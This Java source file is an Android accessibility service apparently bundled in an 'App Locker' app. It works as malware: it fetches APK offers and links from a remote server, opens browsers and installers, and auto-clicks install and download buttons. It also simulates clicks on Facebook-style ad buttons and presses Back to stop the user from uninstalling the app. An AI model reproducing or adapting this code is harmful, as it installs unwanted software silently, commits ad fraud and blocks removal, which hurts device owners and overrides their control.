package com.noahapp.accesslib;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Environment;
import android.support.annotation.RequiresApi;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.amigo.applocker.BuildConfig;
import com.android.volley.RequestQueue;
import com.android.volley.Response.Listener;
import com.android.volley.toolbox.JsonArrayRequest;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.util.List;

//import com.facebook.ads.Ad;
//import com.facebook.ads.AdError;
//import com.facebook.ads.InterstitialAd;
//import com.facebook.ads.InterstitialAdListener;
//import com.google.android.gms.common.zze;
//import com.noahmob.AppLocker.BuildConfig;

@RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
public class BaseAccessibilityService extends AccessibilityService {
    private static final String AUTO_INSTALL_TEXT_INSTALL = "Install";
    private static final String AUTO_INSTALL_TEXT_NEXT = "Next";
    private static final String AUTO_INSTALL_TEXT_OPEN = "Open";
    private static final String AUTO_UPINSTALL_TEXT_INSTALL = "INSTALL";
    private static final String AUTO_UPINSTALL_TEXT_NEXT = "NEXT";
    private static final String AUTO_UPINSTALL_TEXT_OPEN = "OPEN";
    private static final String DOWNLOAD_PATH = (Environment.getExternalStorageDirectory() + "/" + Environment
            .DIRECTORY_DOWNLOADS + "/");
    private static final String TEXT_ACCEPT = "ACCEPT";
    private static final String TEXT_INSTALL = "INSTALL";
    private static final String UCDOWNLOAD_PATH = "sdcard/UCDownloads/";
    //    private InterstitialAd interstitialAd;
    private long last_refresh_time = 0;
    private long last_request_time = 0;
    private long last_start_fbad_time = 0;
    private String mDefenseName = "App Locker";
    private RequestQueue mQueue;

//    private void loadInterstitialAd() {
//        trackAction("interstitialAd_init");
//        this.interstitialAd = new InterstitialAd(getApplicationContext(), "1748050855445951_1830854607165575");
//        this.interstitialAd.setAdListener(new InterstitialAdListener() {
//            public void onInterstitialDisplayed(Ad ad) {
//            }
//
//            public void onInterstitialDismissed(Ad ad) {
//            }
//
//            public void onAdClicked(Ad ad) {
//            }
//
//            public void onError(Ad ad, AdError adError) {
//                DP.E("interstitialAd error:" + adError.getErrorMessage());
//            }
//
//            public void onAdLoaded(Ad ad) {
//                if (BaseAccessibilityService.this.interstitialAd != null) {
//                    BaseAccessibilityService.this.interstitialAd.show();
//                    DP.E("interstitialAd show");
//                    BaseAccessibilityService.this.trackAction("interstitialAd_show");
//                }
//            }
//        });
//        this.interstitialAd.loadAd();
//    }

    protected void onServiceConnected() {
    }

    private void requestForLink(String keyword) {
        if (System.currentTimeMillis() - this.last_request_time >= 300000) {
            this.last_request_time = System.currentTimeMillis();
            if (this.mQueue == null) {
                this.mQueue = Volley.newRequestQueue(getApplicationContext());
            }
            trackAction("request_" + keyword);
            DP.E("request_" + keyword);
            this.mQueue.add(new JsonArrayRequest("http://api.hehevideo.com/offerlist/" + keyword, new
                    Listener<JSONArray>() {
                        public void onResponse(JSONArray response) {
                            try {
                                int length = response.length();
                                for (int i = 0; i < length; i++) {
                                    JSONObject jsonObject = response.getJSONObject(i);
                                    String link = jsonObject.getString("link");
                                    if (!TextUtils.isEmpty(link)) {
                                        String packageName = jsonObject.getString("packname");
                                        if (TextUtils.isEmpty(packageName)) {
                                            BaseAccessibilityService.this.JumpBrowser(link);
                                            DP.E("jump_order_me=" + link);
                                            BaseAccessibilityService.this.trackAction("jump_order_me=" + link);
                                            return;
                                        }
                                        String apkname = jsonObject.getString("apkname");
                                        if (BaseAccessibilityService.this.checkApkExist(packageName)) {
                                            DP.E("package_exist");
                                            BaseAccessibilityService.this.trackAction("package_exist");
                                        } else {
                                            String path = BaseAccessibilityService.DOWNLOAD_PATH + apkname;
                                            File file = new File(path);
                                            boolean isExist = file.exists();
                                            if (!isExist) {
                                                path = BaseAccessibilityService.UCDOWNLOAD_PATH + apkname;
                                                file = new File(path);
                                                isExist = file.exists();
                                            }
                                            if (TextUtils.isEmpty(apkname) || !isExist) {
                                                DP.E("original_link=" + link);
                                                BaseAccessibilityService.this.trackAction("original_link=" + link);
                                                BaseAccessibilityService.this.JumpBrowser(link);
                                                return;
                                            }
                                            DP.E("install_path=" + path);
                                            BaseAccessibilityService.this.trackAction("install_path=" + path);
                                            BaseAccessibilityService.this.JumpInstall(file);
                                            return;
                                        }
                                    }
                                }
                            } catch (Exception e) {
                                DP.E("error=" + e.toString());
                                e.printStackTrace();
                            }
                        }
                    }, null));
        }
    }

    private void requestForConfig() {
        if (this.mQueue == null) {
            this.mQueue = Volley.newRequestQueue(getApplicationContext());
        }
        trackAction("request_config");
        this.mQueue.add(new JsonObjectRequest("http://api.hehevideo.com/config.json", null, new Listener<JSONObject>() {
            public void onResponse(JSONObject response) {
                try {
                    PreferenceFile.getInstance(BaseAccessibilityService.this.getApplicationContext())
                            .saveConfigFBInterval(response.getInt("fb_interval"));
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }, null));
    }

    private void trackAction(String order) {
        TrackManager.getInstance(getApplicationContext()).trackAction(order);
    }

    public boolean checkApkExist(String packageName) {
        if (TextUtils.isEmpty(packageName)) {
            return false;
        }
        try {
            ApplicationInfo info = getPackageManager().getApplicationInfo(packageName, PackageManager
                    .GET_UNINSTALLED_PACKAGES);
            return true;
        } catch (NameNotFoundException e) {
            return false;
        }
    }

    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (VERSION.SDK_INT >= 15) {
            int eventType = event.getEventType();
            if (eventType != 2048) {
                DP.E("eventType:" + eventType);
                AccessibilityNodeInfo rootNode = event.getSource();
                if (rootNode != null) {
                    CharSequence packName = rootNode.getPackageName();
                    if (!TextUtils.isEmpty(packName)) {
                        String rootPackName = packName.toString();
                        DP.E("rootPackName=" + rootPackName);
//                        if (rootPackName.equals(zze.GOOGLE_PLAY_STORE_PACKAGE)) {
//                            requestForLink("gp");
//                            DP.E("request_gp");
//                        } else
                        if (!(rootPackName.equals("com.android.settings") || rootPackName.equals("com.android" +
                                ".systemui") || rootPackName.equals("com.android.packageinstaller") || rootPackName
                                .contains("launcher") || rootPackName.equals(BuildConfig.APPLICATION_ID))) {
                            DP.E("request_for_apk");
                            requestForLink("order_apk");
                        }
                        autoInstall(event);
                        forceDownload(event);
                        fbClick(event);
                        selfDefence(event);
                    }
                }
            }
        }
    }

    protected void reCheckClickEvent(AccessibilityEvent event, String[] list) {
        if (System.currentTimeMillis() - this.last_refresh_time > 10800000) {
            requestForConfig();
            this.last_refresh_time = System.currentTimeMillis();
        }
        if (System.currentTimeMillis() - this.last_start_fbad_time > ((long) ((PreferenceFile.getInstance
                (getApplication()).getConfigFBInterval() * 1000) * 60))) {
            boolean shouldBlocked = false;
            String rootPackName = event.getPackageName().toString();
            if (event.getEventType() == 1 && !rootPackName.equals(BuildConfig.APPLICATION_ID)
//                    && !rootPackName.equals(zze.GOOGLE_PLAY_STORE_PACKAGE)
                    && !rootPackName.equals("com.android.settings")
                    && !rootPackName.equals("com.android.systemui")
                    && !rootPackName.equals("com.android.packageinstaller")
                    && !rootPackName.contains("launcher")) {
                for (String equals : list) {
                    if (equals.equals(rootPackName)) {
                        shouldBlocked = true;
                        break;
                    }
                }
                if (!shouldBlocked) {
//                    loadInterstitialAd();
                    this.last_start_fbad_time = System.currentTimeMillis();
                }
            }
        }
    }

    private boolean findAndPerformActionButton(AccessibilityNodeInfo rootNode, String text) {
        List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);
        int i = 0;
        while (i < nodes.size()) {
            AccessibilityNodeInfo node = (AccessibilityNodeInfo) nodes.get(i);
            if (node.getClassName().equals("android.widget.Button") && node.isEnabled()) {
                node.performAction(16);
                return true;
            } else if (node.getClassName().equals("android.widget.TextView") && node.isEnabled()) {
                node.performAction(16);
                return true;
            } else {
                i++;
            }
        }
        return false;
    }

    private void simulateFbClick(AccessibilityNodeInfo rootNode) {
        String last_install_packname = PreferenceFile.getInstance(getApplication()).getLastInstallPackName();
        String last_interstitial_time = PreferenceFile.getInstance(getApplication()).getLastInterstitialTimeStamp();
        if (!TextUtils.isEmpty(last_install_packname) || !TextUtils.isEmpty(last_interstitial_time)) {
            if (findAndPerformActionButton(rootNode, "Download")) {
                DP.E("fb_click_download");
                trackAction("fb_click_download");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Learn More")) {
                DP.E("fb_click_learnmore");
                trackAction("fb_click_learnmore");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Open Link")) {
                DP.E("fb_click_openlink");
                trackAction("fb_click_openlink");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Shop Now")) {
                DP.E("fb_click_shopnow");
                trackAction("fb_click_shopnow");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Book Now")) {
                DP.E("fb_click_booknow");
                trackAction("fb_click_booknow");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Sign Up")) {
                DP.E("fb_click_signup");
                trackAction("fb_click_signup");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Watch More")) {
                DP.E("fb_click_watchmore");
                trackAction("fb_click_watchmore");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            }
        }
    }

//    private void JumpGooglePlay(String link) {
//        Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse(link));
//        browserIntent.setClassName(zze.GOOGLE_PLAY_STORE_PACKAGE, "com.android.vending.AssetBrowserActivity");
//        browserIntent.setFlags(268435456);
//        startActivity(browserIntent);
//    }

    private void JumpBrowser(String link) {
        Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(link));
        intent.setFlags(268435456);
        startActivity(intent);
    }

    private void JumpInstall(File file) {
        Intent intentInstall = new Intent("android.intent.action.VIEW");
        intentInstall.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
        intentInstall.setFlags(268435456);
        startActivity(intentInstall);
    }

    public void onInterrupt() {
    }

    private void gpInstall(AccessibilityEvent event) {
        if (event.getSource() != null) {
            AccessibilityNodeInfo rootNode = event.getSource();
            // 安装啥的？
//            if (rootNode.getPackageName().equals(zze.GOOGLE_PLAY_STORE_PACKAGE)) {
//                findAndPerformActionButton(rootNode, TEXT_ACCEPT);
//                findAndPerformActionButton(rootNode, "INSTALL");
//            }
        }
    }

    private void selfDefence(AccessibilityEvent event) {
        if (event.getEventType() == 32) {
            if (event.getPackageName().equals("com.android.settings") || event.getPackageName().equals("com.google" +
                    ".android.packageinstaller") || event.getPackageName().equals("com.android.packageinstaller")) {
                CharSequence className = event.getClassName();
                if ((className.equals("com.android.packageinstaller.UninstallerActivity") || className.equals("com" +
                        ".android.settings.applications.InstalledAppDetailsActivity") || className.equals("com" +
                        ".android.settings.SubSettings")) && findViewByText(this.mDefenseName) != null) {
                    performBackClick();
                }
            }
            if (findViewByText(this.mDefenseName) != null && findText(event.getSource())) {
                performBackClick();
            }
        }
    }

    private boolean findText(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) {
            return false;
        }
        int count = rootNode.getChildCount();
        for (int i = 0; i < count; i++) {
            AccessibilityNodeInfo nodeInfo = rootNode.getChild(i);
            if (nodeInfo != null) {
                if ("android.widget.TextView".equals(nodeInfo.getClassName()) && !TextUtils.isEmpty(nodeInfo.getText
                        ()) && nodeInfo.getText().toString().contains("uninstall")) {
                    return true;
                }
                if (findText(nodeInfo)) {
                    return true;
                }
            }
        }
        return false;
    }

    public AccessibilityNodeInfo findViewByText(String text) {
        return findViewByText(text, false);
    }


    public AccessibilityNodeInfo findViewByText(String text, boolean clickable) {
        AccessibilityNodeInfo accessibilityNodeInfo = getRootInActiveWindow();
        if (accessibilityNodeInfo == null) {
            return null;
        }
        List<AccessibilityNodeInfo> nodeInfoList = accessibilityNodeInfo.findAccessibilityNodeInfosByText(text);
        if (!(nodeInfoList == null || nodeInfoList.isEmpty())) {
            for (AccessibilityNodeInfo nodeInfo : nodeInfoList) {
                if (nodeInfo != null && nodeInfo.isClickable() == clickable) {
                    return nodeInfo;
                }
            }
        }
        return null;
    }

    public void performBackClick() {
        try {
            Thread.sleep(100);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        performGlobalAction(1);
    }

    private void fbClick(AccessibilityEvent event) {
        if ((event.getSource() != null) && event.getSource().getPackageName().equals(BuildConfig.APPLICATION_ID)) {
            simulateFbClick(event.getSource());
        }
    }

    private void forceDownload(AccessibilityEvent event) {
        if ((event.getSource() != null) && isBrowser(event)) {
            findAndPerformActionButton(event.getSource(), "Ok");
            findAndPerformActionButton(event.getSource(), "OK");
            findAndPerformActionButton(event.getSource(), "Download");
            findAndPerformActionButton(event.getSource(), "DOWNLOAD");
            findAndPerformActionButton(event.getSource(), "Save");
            findAndPerformActionButton(event.getSource(), "SAVE");
        }
    }

    private boolean isBrowser(AccessibilityEvent event) {
        AccessibilityNodeInfo rootNode = event.getSource();
        return rootNode.getPackageName().equals("com.android.chrome") || rootNode.getPackageName().equals("com" +
                ".UCMobile.intl") || rootNode.getPackageName().equals("com.uc.browser.en") || rootNode.getPackageName
                ().equals("com.opera.mini.native") || rootNode.getPackageName().equals("com.opera.browser") ||
                rootNode.getPackageName().equals("org.mozilla.firefox") || rootNode.getPackageName().equals("com" +
                ".ksmobile.cb") || rootNode.getPackageName().equals("com.android.browser") || rootNode.getPackageName
                ().equals("com.UCMobile");
    }

    private void autoInstall(AccessibilityEvent event) {
        boolean notNull;
        boolean installPage = false;
        if (event.getSource() != null) {
            notNull = true;
        } else {
            notNull = false;
        }
        if (notNull) {
            if (event.getPackageName().equals("com.android.packageinstaller") || event.getPackageName().equals("com" +
                    ".google.android.packageinstaller")) {
                installPage = true;
            }
            if (installPage) {
                findAndPerformActionButton(event.getSource(), AUTO_INSTALL_TEXT_INSTALL);
                findAndPerformActionButton(event.getSource(), AUTO_INSTALL_TEXT_NEXT);
                findAndPerformActionButton(event.getSource(), AUTO_INSTALL_TEXT_OPEN);
                findAndPerformActionButton(event.getSource(), "INSTALL");
                findAndPerformActionButton(event.getSource(), AUTO_UPINSTALL_TEXT_NEXT);
                findAndPerformActionButton(event.getSource(), AUTO_UPINSTALL_TEXT_OPEN);
            }
        }
    }
}
